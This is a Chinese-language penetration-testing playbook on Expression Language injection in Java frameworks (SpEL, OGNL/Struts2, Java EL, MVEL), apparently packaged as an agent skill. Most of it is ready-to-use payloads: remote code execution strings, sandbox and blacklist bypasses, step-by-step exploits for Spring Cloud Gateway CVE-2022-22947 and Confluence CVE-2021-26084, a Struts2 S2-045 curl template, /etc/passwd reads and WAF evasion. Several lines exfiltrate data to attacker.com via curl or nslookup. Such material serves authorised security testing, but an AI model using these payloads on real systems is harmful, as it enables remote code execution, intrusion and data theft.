# expression-language-injection

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# 表达式语言(EL)注入方法论


**关键区分**：SSTI 针对模板渲染引擎；EL 注入针对 Java 框架中嵌入的**表达式求值器**。

---

## 1. 检测 — 多语法探测

```text
${7*7}              → 49 = SpEL、OGNL 或 Java EL
#{7*7}              → 49 = SpEL（替代语法）或 JSF EL
%{7*7}              → 49 = OGNL（Struts2）
${T(java.lang.Math).random()}  → 随机浮点数 = SpEL 确认
%{#context}         → 对象 dump = OGNL 确认
```

### 区分引擎

| `${7*7}` 响应 | `%{7*7}` 响应 | 引擎 |
|---|---|---|
| 49 | 原样 `%{7*7}` | SpEL 或 Java EL |
| 原样 `${7*7}` | 49 | OGNL（Struts2） |
| 49 | 49 | 两者可能同时存在 |

---

## 2. SpEL（Spring Expression Language）

### 出现位置

- `@Value("${...}")` 注解
- Spring Security 表达式（`@PreAuthorize`）
- Spring Cloud Gateway 路由谓词和过滤器
- Thymeleaf `th:text="${...}"`（配合 `__${...}__` 预处理时）
- Spring Data `@Query` 中的 SpEL

### RCE — Runtime.exec

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

### RCE — 带输出回显（Commons IO）

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
```

### RCE — 带输出回显（Spring StreamUtils）

```java
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
```

### ProcessBuilder（Runtime 被阻止时）

```java
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
```

### Spring Cloud Gateway — CVE-2022-22947

通过 actuator 添加含 SpEL 过滤器的恶意路由：

```bash
# 步骤 1: 添加路由（SpEL 在 filter 中）
POST /actuator/gateway/routes/hacktest
Content-Type: application/json
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
}

# 步骤 2: 刷新路由
POST /actuator/gateway/refresh

# 步骤 3: 触发路由
GET /hackpath
# 响应头 "Result" 包含命令输出

# 步骤 4: 清理
DELETE /actuator/gateway/routes/hacktest
POST /actuator/gateway/refresh
```

### SpEL 沙箱绕过

当使用 `SimpleEvaluationContext`（限制 `T()` 操作符）时：

```java
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

---

## 3. OGNL（Object-Graph Navigation Language）

### 出现位置

- Apache Struts2 — 主要 OGNL 消费者
- Confluence Server — 部分请求路径使用 OGNL
- 任何使用 `ognl.Ognl.getValue()`/`ognl.Ognl.setValue()` 的 Java 应用

### 基础 RCE

```
%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}
```

### Struts2 沙箱绕过 — _memberAccess 操纵

Struts2 通过 `SecurityMemberAccess` 限制 OGNL。经典绕过：

```
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

### OgnlUtil 黑名单清除

较新 Struts2 版本使用类/包黑名单，通过清除 `excludedClasses` 和 `excludedPackageNames` 绕过：

```
%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}
```

### Struts2 关键 CVE

| CVE | 向量 | Payload 位置 |
|---|---|---|
| S2-045（CVE-2017-5638） | Content-Type header | Content-Type 中 `%{...}` |
| S2-046（CVE-2017-5638） | Multipart filename | 上传文件名中 OGNL |
| S2-016（CVE-2013-2251） | `redirect:`/`redirectAction:` 前缀 | URL 参数 |
| S2-048（CVE-2017-9791） | Struts Showcase | ActionMessage 中 OGNL |
| S2-057（CVE-2018-11776） | Namespace OGNL | URL 路径 |

### Confluence OGNL — CVE-2021-26084

Confluence Server 通过 `queryString` 或 action 参数允许 OGNL 注入：

```bash
POST /pages/createpage-entervariables.action
Content-Type: application/x-www-form-urlencoded

queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027
# URL 解码: \u0027+{3*3}+\u0027
# 如果响应包含 9 → 确认存在 OGNL 注入
# 升级到 Runtime.exec 实现 RCE
```

---

## 4. Java EL（JSP / JSF）

### 出现位置

- JSP 页面：`${expression}` 和 `#{expression}`
- JSF（JavaServer Faces）：值和方法绑定
- 自定义标签库

### RCE Payload

```java
// Java EL + Runtime:
${Runtime.getRuntime().exec("id")}

// 通过 pageContext（JSP）:
${pageContext.request.getServletContext().getClassLoader()}

// 反射方式:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}
```

---

## 5. 决策树

```
输入反射且 ${7*7} 返回 49？
├── Java 应用？
│   ├── Struts2？→ 尝试 %{...} OGNL payload
│   │   └── 检查 Content-Type 注入（S2-045）
│   ├── Spring？→ 尝试 T(java.lang.Runtime) SpEL
│   │   └── 检查 /actuator/gateway（Spring Cloud Gateway）
│   ├── Confluence？→ 尝试 OGNL via action 参数
│   └── JSP/JSF？→ 尝试 Java EL payload
│
├── 错误信息暴露框架？
│   ├── "ognl.OgnlException" → OGNL
│   ├── "SpelEvaluationException" → SpEL
│   └── "javax.el.ELException" → Java EL
│
└── 被沙箱阻止？
    ├── OGNL: 清除 _memberAccess / excludedClasses
    ├── SpEL: 反射绕过 SimpleEvaluationContext
    └── 尝试替代执行方式（ProcessBuilder, ScriptEngine）
```

---

## 6. 速查

```text
# SpEL RCE:
${T(java.lang.Runtime).getRuntime().exec("id")}

# OGNL RCE (Struts2):
%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# OGNL + 沙箱绕过:
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}

# Java EL RCE:
${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}

# Confluence CVE-2021-26084 探测:
queryString=\u0027%2b{3*3}%2b\u0027

# Spring Cloud Gateway CVE-2022-22947:
POST /actuator/gateway/routes/x  → SpEL in filter args
POST /actuator/gateway/refresh
```

## 深入参考

- EL/SpEL/OGNL RCE payload 与沙箱绕过 → [references/el-exploitation.md](references/el-exploitation.md)


---

## REF: el-exploitation

# EL/SpEL/OGNL/MVEL 深度利用手册

## SpEL 高级 Payload 变体

### 反射链 — 绕过 T() 限制

当 `SimpleEvaluationContext` 禁用 `T()` 操作符时，通过字符串反射链到达 Runtime：

```java
#{''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

### getDeclaredConstructors 链

Runtime 构造器为 private，通过 `setAccessible` 绕过：

```java
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
```

### ProcessBuilder 分步构造（避免数组语法被过滤）

```java
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("/bin/sh")}
${request.getAttribute("c").add("-c")}
${request.getAttribute("c").add("curl http://attacker.com/$(whoami)")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
```

### ScriptEngine 执行 — 跳出 EL 进入 JS 引擎

```java
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('id')")}
```

多行 JavaScript payload（适用于复杂命令）：

```java
${'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command('whoami'); x.start()")}
```

### 字符编码绕过 WAF

通过 `Character.toChars()` 逐字符拼接命令，规避关键字检测：

```java
T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).valueOf(new char[]{T(java.lang.Character).toChars(105)[0],T(java.lang.Character).toChars(100)[0]}))
```

上例等价于执行 `id`，每个字符用 ASCII 码位替代。

---

## OGNL 高级利用技术

### 文件读取

通过 OGNL 构造 FileInputStream 读取服务器文件：

```text
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#f=new java.io.File('/etc/passwd'),#is=new java.io.FileInputStream(#f),#b=new byte[(int)#f.length()],#is.read(#b),#is.close(),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.print(new java.lang.String(#b)),#out.close()}
```

### 目录列举

```text
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#f=new java.io.File('/tmp'),#list=@java.util.Arrays@toString(#f.listFiles()),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.print(#list),#out.close()}
```

### Struts2 版本级沙箱绕过演进

| 版本范围 | 防护机制 | 绕过方法 |
|---|---|---|
| Struts 2.0 - 2.3.14 | 无沙箱 | 直接 `@java.lang.Runtime@getRuntime().exec()` |
| Struts 2.3.14 - 2.3.28 | SecurityMemberAccess | 设置 `#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS` |
| Struts 2.3.29 - 2.3.34 | excludedClasses 黑名单 | 通过 container 获取 OgnlUtil 后 `.excludedClasses.clear()` |
| Struts 2.5.0 - 2.5.12 | 增强黑名单 + excludedPackageNames | 同时清除 excludedClasses 和 excludedPackageNames |
| Struts 2.5.13+ | OGNL 沙箱重写 | 需 CVE 特定绕过或链式漏洞 |

### S2-045 Content-Type 注入模板

```bash
curl -H "Content-Type: %{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" http://target/action.action
```

---

## MVEL 表达式注入

### 识别特征

MVEL 常见于规则引擎（Drools）、工作流引擎及部分自定义框架。语法类似 Java 但支持简写。

### 基础 RCE

```java
Runtime.getRuntime().exec("id")
```

### 反射链 RCE

```java
new java.lang.ProcessBuilder(new String[]{"/bin/sh","-c","id"}).start()
```

### 通过 ClassLoader 加载

```java
Thread.currentThread().getContextClassLoader().loadClass("java.lang.Runtime").getMethod("exec",String.class).invoke(Thread.currentThread().getContextClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")
```

---

## 盲注技术

目标无回显时的确认与数据外带方法。

### 基于时间的盲注

SpEL：

```java
${T(java.lang.Thread).sleep(5000)}
```

OGNL：

```text
%{#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Thread@sleep(5000)}
```

### DNS/HTTP 外带

SpEL DNS 外带：

```java
${T(java.lang.Runtime).getRuntime().exec("nslookup $(whoami).attacker.com")}
```

OGNL HTTP 外带：

```text
%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='curl http://attacker.com/exfil?d=`cat /etc/hostname`').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(new String[]{'/bin/sh','-c',#cmd}))}
```

### 基于报错的信息泄露

触发异常时框架可能将表达式求值结果包含在错误信息中：

```java
${T(java.lang.Runtime).getRuntime().exec("id").getInputStream().read()}
```

返回值为整数（首字节 ASCII），可逐字节提取命令输出。

---

## Java EL 高级利用

### 通过 pageContext 获取请求/响应对象

```java
${pageContext.request.getServletContext()}
${pageContext.request.getSession().setAttribute("admin",true)}
```

### 环境变量与上下文探测

```java
${applicationScope}
${requestScope}
${sessionScope.toString()}
${initParam}
${param.userInput}
```

### facesContext 回显（JSF 环境）

```java
${facesContext.getExternalContext().setResponseHeader("X-Out","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("var r=new java.lang.ProcessBuilder;r.command('/bin/sh','-c','id');var p=r.start();var s=new java.util.Scanner(p.getInputStream()).useDelimiter('\\\\A');s.hasNext()?s.next():''"))}
```

---

## 通用绕过技巧

### 关键字黑名单绕过

| 被过滤关键字 | 绕过方式 |
|---|---|
| `Runtime` | `"".getClass().forName("java.lang.Ru"+"ntime")` |
| `getClass` | `""["class"]` |
| `exec` | 通过 `getMethod("e"+"xec",...)` 反射调用 |
| `.` (点号) | URL 编码 `%2e` 或 Unicode `\u002e` |

### Unicode 绕过（Confluence 场景）

```text
\u0027+{3*3}+\u0027
```

单引号用 `\u0027` 替代，花括号保留，适用于 CVE-2021-26084 等 OGNL 注入场景。

### 嵌套求值（Thymeleaf 预处理）

Thymeleaf `__${...}__` 预处理语法会在模板渲染前先执行 SpEL：

```text
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

URL 编码后投递至可控的视图名参数。
